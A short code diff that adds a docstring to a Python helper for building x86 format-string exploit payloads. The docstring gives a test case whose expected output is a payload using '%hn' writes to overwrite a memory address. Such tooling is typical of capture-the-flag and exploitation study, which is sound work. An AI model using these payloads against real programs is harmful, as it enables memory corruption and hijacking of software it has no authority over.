@@ -68,6 +68,14 @@ def make_x86_payload(address_to_write_to, value_to_write, offset=1):
 
 
 def new_make_fmt_string(address_to_write_to, value_to_write, offset=1):
+    """
+    test casenew_make_fmt_string(0x080497ac, 0xffffd258)
+    should output b'\xae\x97\x04\x08\xac\x97\x04\x08%.54844x%2\$hn%.10683x%1\$hn'
+    :param address_to_write_to:
+    :param value_to_write:
+    :param offset:
+    :return:
+    """
     val = value_to_write
     address_size = 4
     pack_symb = '<I'
